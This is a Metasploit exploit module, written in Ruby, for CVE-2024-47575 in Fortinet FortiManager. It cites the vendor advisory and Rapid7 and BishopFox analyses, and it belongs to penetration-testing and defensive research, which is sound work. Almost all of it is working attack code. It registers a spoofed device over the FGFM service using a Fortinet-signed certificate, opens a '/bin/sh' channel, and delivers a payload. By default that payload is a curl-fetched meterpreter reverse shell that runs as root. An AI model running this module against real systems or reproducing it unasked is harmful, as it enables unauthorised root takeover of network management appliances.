##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Fortinet FortiManager Unauthenticated RCE',
        'Description' => %q{
          This module exploits a missing authentication vulnerability affecting FortiManager and FortiManager
          Cloud devices to achieve unauthenticated RCE with root privileges.

          To successfully connect to a target FortiManager device, you must acquire a valid x509 certificate
          from a Fortinet device.

          The vulnerable FortiManager versions are:
          * 7.6.0
          * 7.4.0 through 7.4.4
          * 7.2.0 through 7.2.7
          * 7.0.0 through 7.0.12
          * 6.4.0 through 6.4.14
          * 6.2.0 through 6.2.12

          The vulnerable FortiManager Cloud versions are:
          * 7.4.1 through 7.4.4
          * 7.2.1 through 7.2.7
          * 7.0.1 through 7.0.12
          * 6.4 (all versions).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF Exploit & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2024-47575'],
          # AttackerKB Rapid7 Analysis.
          ['URL', 'https://attackerkb.com/topics/OFBGprmpIE/cve-2024-47575/rapid7-analysis'],
          # BishopFox details certificate requirements for connecting to the FGFM service.
          ['URL', 'https://bishopfox.com/blog/a-look-at-fortijump-cve-2024-47575'],
          # Vendor Advisory.
          ['URL', 'https://fortiguard.fortinet.com/psirt/FG-IR-24-423']
        ],
        'DisclosureDate' => '2024-10-23',
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_CMD],
        'Privileged' => true, # Code execution as 'root'
        'DefaultOptions' => {
          'RPORT' => 541,
          'SSL' => true,
          'PAYLOAD' => 'cmd/linux/http/x64/meterpreter_reverse_tcp',
          'FETCH_WRITABLE_DIR' => '/tmp',
          'FETCH_COMMAND' => 'CURL'
        },
        'Targets' => [ [ 'Default', {} ] ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('ClientCert', [true, 'A file path to an x509 cert, signed by Fortinet, with a serial number in the CN', nil]),
        OptString.new('ClientKey', [true, 'A file path to the corresponding private key for the ClientCert.', nil]),
        OptString.new('ClientSerialNumber', [false, 'If set, use this serial number instead of extracting one from the ClientCert.', nil]),
        OptString.new('ClientPlatform', [false, 'If set, use this platform instead of determining the platform at runtime.', nil])
      ]
    )
  end

  def check
    s = make_socket

    peer_cert = OpenSSL::X509::Certificate.new(s.peer_cert)

    s.close

    organization = get_cert_subject_item(peer_cert, 'O')

    common_name = get_cert_subject_item(peer_cert, 'CN')

    # Detect that the target is a Fortinet FortiManager, by inspecting the certificate the server is using.
    # We look for an organization (O) of 'Fortinet', and a common name (CN) that starts with a FortiManager serial
    # number identifier.
    return CheckCode::Detected if organization == 'Fortinet' && common_name&.start_with?('FMG')

    CheckCode::Unknown
  end

  def exploit
    client_cert_raw = File.read(datastore['ClientCert'])

    client_cert = OpenSSL::X509::Certificate.new(client_cert_raw)

    common_name = get_cert_subject_item(client_cert, 'CN')

    print_status("Client certificate common name: #{common_name}")

    serial_number = 'FMG-VMTM24011111'
    platform = 'FortiManager-VM64'

    if common_name.start_with?('FMG')
      serial_number = common_name
      platform = 'FortiManager-VM64'
    elsif common_name.start_with?('FG')
      serial_number = common_name
      platform = 'FortiGate-VM64'
    else
      print_warning('Client certificate does not include a serial number in the common name. The target must be configured to accept a certificate like this.')
    end

    serial_number = datastore['ClientSerialNumber'] if datastore['ClientSerialNumber']
    platform = datastore['ClientPlatform'] if datastore['ClientPlatform']

    print_status("Using client serial number '#{serial_number}' and platform '#{platform}'.")

    print_status('Connecting...')

    s = make_socket

    fail_with(Failure::UnexpectedReply, 'Connection failed.') unless s

    print_status('Registering device...')

    req1 = "get auth\r\nserialno=#{serial_number}\r\nplatform=#{platform}\r\nhostname=localhost\r\n\r\n\x00"

    resp1 = send_packet(s, req1)

    unless resp1.include? 'reply 200'
      fail_with(Failure::UnexpectedReply, 'Request 1 failed: No reply 200.')
    end

    print_status('Creating channel...')

    req2 = "get connect_tcp\r\ntcp_port=rsh\r\nchan_window_sz=#{32 * 1024}\r\nterminal=1\r\ncmd=/bin/sh\r\nlocalid=0\r\n\r\n\x00"

    resp2 = send_packet(s, req2)

    unless resp2.include? 'action=ack'
      fail_with(Failure::UnexpectedReply, 'Request 2 failed: No ack.')
    end

    localid = resp2.match(/localid=(\d+)/)
    unless localid
      fail_with(Failure::UnexpectedReply, 'Request 2 failed: No localid found.')
    end

    print_status('Triggering...')

    req3 = "channel\r\nremoteid=#{localid[1]}\r\n\r\n\x00" + payload.encoded.length.to_s + "\n" + payload.encoded + "0\n"

    send_packet(s, req3, read: false)

    # A short delay, as we send our payload over the chanel, we want to keep this channel open long enough for the
    # server-side to process it and execute the payload, before we tear down the socket.
    Rex::ThreadSafe.sleep(1)

    s.close
  end

  def make_socket
    Rex::Socket::Tcp.create(
      'PeerHost' => datastore['RHOST'],
      'PeerPort' => datastore['RPORT'],
      'SSL' => true,
      'SSLVerifyMode' => 'NONE',
      'SSLClientCert' => datastore['ClientCert'],
      'SSLClientKey' => datastore['ClientKey'],
      'Context' =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
    )
  end

  def send_packet(sock, data, read: true)
    packet = [0x36E01100, data.length + 8].pack('NN')

    packet += data

    sock.write(packet)

    return unless read

    _, len = sock.read(8).unpack('NN')

    sock.read(len - 8)
  end

  def get_cert_subject_item(cert, type)
    cert.subject.to_a.each do |item|
      return item[1] if item[0] == type
    end
    nil
  end
end
